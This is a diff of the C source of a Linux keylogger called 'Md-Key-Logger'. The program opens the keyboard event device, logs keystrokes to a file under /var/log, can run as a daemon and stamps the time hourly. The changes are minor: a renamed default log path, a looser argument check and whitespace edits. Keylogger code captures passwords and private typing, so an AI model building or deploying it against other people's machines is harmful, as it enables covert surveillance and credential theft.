@@ -53,7 +53,7 @@ int main(int argc, char **argv) {
             case 'h':
                 printf(" Md-Key-Logger V 1.0\n"
                         " Usage: [OPTION]...\n"
-                        "  -l, --log-file <file>  write log to FILE (default=/var/log/Mkey_logger.log)\n"
+                        "  -l, --log-file <file>  write log to FILE (default=/var/log/MD-key-logger.log)\n"
                         "  -d, --daemon  run as daemon\n"
                         "  -h, --help    show this message\n"
                         "  \n");
@@ -66,10 +66,9 @@ int main(int argc, char **argv) {
         return EXIT_FAILURE;
     }
 
-    if (log_file && strlen(log_file) != 1 && log_file[0] != '-' && log_file[1] != '\0') {
+    if ( strlen(log_file) >= 1 ) {
         if (!(log = fopen(log_file, "a"))) {
             perror("fopen");
-
             return EXIT_FAILURE;
         }
 
@@ -80,14 +79,12 @@ int main(int argc, char **argv) {
 
     if (get_path_keyboard(stream_path) == -1) {
         fprintf(stderr, "Can't find default event device.\n");
-
         return EXIT_FAILURE;
     }
 
     if ((get_stream_key = open(stream_path, O_RDONLY | O_NOCTTY)) < 0) {
         perror("open");
         fprintf(stderr, "Can't read your input device...\n");
-
         return EXIT_FAILURE;
     }
 
@@ -98,7 +95,6 @@ int main(int argc, char **argv) {
     get_time_now(timestring);
     fprintf(log, "\n Starting key logger: %s\n", timestring);
     bzero(timestring, 80);
-
     start = clock();
 
     while (readable > 0) {
@@ -139,7 +135,7 @@ int main(int argc, char **argv) {
             }
         }
         end = clock();
-        if ((((end - start)) / CLOCKS_PER_SEC) >= 3600) { // log time every 1 hour
+        if ((((end - start)) / CLOCKS_PER_SEC) >= 3600) { // log time every one hour
             get_time_now(timestring);
             fprintf(log, "\n%s\n", timestring);
             fflush(log);
